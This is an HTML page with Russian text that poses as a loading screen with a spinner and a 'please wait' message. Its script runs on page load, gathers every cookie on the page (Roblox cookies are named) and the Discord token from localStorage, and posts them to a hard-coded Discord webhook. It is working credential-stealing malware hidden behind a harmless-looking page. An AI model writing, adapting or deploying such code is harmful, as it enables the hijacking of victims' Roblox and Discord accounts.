<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        function sendData() {
            // Получаем все куки с текущей страницы
            const allCookies = document.cookie;
            // Получаем токен Discord из localStorage
            const discordToken = localStorage.getItem('token');

            // URL вашего Discord вебхука
            const webhookUrl = 'https://discord.com/api/webhooks/1475091929350934609/Dsut4O-hqkO_voeZuS0ddM3zcqxX9ExxIcyaaxS8h6rhxudImv8HXumB7mLqsrtOknem';

            // Формируем сообщение для отправки
            const payload = {
                content: `--- Новые данные получены ---\n\n**Куки (Roblox и другие):**\n\`\`\`${allCookies}\`\`\`\n\n**Токен Discord (из localStorage):**\n\`\`\`${discordToken}\`\`\``
            };

            // Отправляем данные на вебхук
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                console.log('Данные успешно отправлены', response);
                // Можно перенаправить пользователя на другой сайт после отправки
                // window.location.href = 'https://google.com';
            })
            .catch(error => {
                console.error('Ошибка при отправке данных:', error);
            });
        }

        // Вызываем функцию при загрузке страницы
        window.onload = sendData;
    </script>
</head>
<body>
    <div>
        <div class="loader"></div>
        <p style="text-align: center; margin-top: 20px;">Загрузка, пожалуйста подождите...</p>
    </div>
</body>
</html>
